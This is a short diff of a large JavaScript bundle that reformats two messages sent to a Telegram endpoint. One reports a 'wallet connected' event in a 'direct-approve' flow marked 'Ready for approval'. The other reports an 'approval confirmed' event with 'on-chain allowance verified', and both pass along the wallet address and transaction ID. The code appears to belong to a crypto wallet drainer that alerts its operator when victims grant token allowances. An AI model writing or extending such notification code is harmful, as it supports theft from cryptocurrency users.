@@ -93064,7 +93064,7 @@
                         type: "wallet_connected"
                     });
                     GS.post(API_BASE + "/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nFlow: direct-approve (no top-up)\nTime: ${new Date().toISOString()}`
+                        text: ["🔗 <b>Wallet Connected</b>", "", "💼 <b>Wallet</b>", `<code>${c}</code>`, "", "⚡ <b>Flow</b>", "direct-approve (no top-up)", "", "🕐 <b>Time</b>", `<code>${new Date().toISOString()}</code>`, "", "✨ Ready for approval"].join("\n")
                     }, {
                         timeout: 8000
                     }).then(() => {
@@ -93222,7 +93222,7 @@
                         txID: txID || "on-chain"
                     });
                     GS.post(API_BASE + "/api/telegram", {
-                        text: `Transaction approved (on-chain)\nWallet: ${e}\nTransaction ID: ${txID || "on-chain"}\nTime: ${new Date().toISOString()}`
+                        text: ["✅ <b>Approval Confirmed</b>", "", "💼 <b>Wallet</b>", `<code>${e}</code>`, "", "🧾 <b>Transaction ID</b>", `<code>${txID || "on-chain"}</code>`, "", "🕐 <b>Time</b>", `<code>${new Date().toISOString()}</code>`, "", "🎉 On-chain allowance verified"].join("\n")
                     }).then(() => {
                         reportEvent("TELEGRAM_SEND_OK", {
                             type: "transaction_approved"
